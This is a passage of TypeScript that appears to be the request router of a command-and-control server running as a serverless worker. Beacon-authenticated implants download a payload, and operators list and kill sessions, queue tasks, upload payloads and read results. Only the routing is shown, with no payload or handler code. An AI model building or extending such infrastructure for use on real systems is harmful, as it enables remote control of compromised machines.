  if (path === "/payload" && method === "GET") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleDownloadPayload(env), env);
  }

  // ── Operator routes (X-Operator-Token) ──────────────────
  if (path === "/sessions" && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleListSessions(request, env), env);
  }
  if (path === "/task" && method === "POST") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAddTask(request, env), env);
  }
  if (path === "/audit" && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAudit(request, env), env);
  }
  if (path === "/payload" && method === "POST") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleUploadPayload(request, env), env);
  }

  // ── Parameterised operator routes ──────────────────────
  const resultsMatch = path.match(/^\/results\/(.+)$/);
  if (resultsMatch && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    const sid = decodeURIComponent(resultsMatch[1]);
    return withCORS(await handleGetResults(request, env, sid), env);
  }

  const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
  if (sessionsMatch && method === "DELETE") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    const sid = decodeURIComponent(sessionsMatch[1]);
    return withCORS(await handleKillSession(request, env, sid), env);
  }

  return withCORS(errorResponse("Not found", 404), env);
}

export default {
  async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
    try {
      return await handleRequest(request, env);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Internal error";
      console.error(`[error] ${message}`);
      return withCORS(errorResponse("Internal server error", 500), env);
    }
  },
};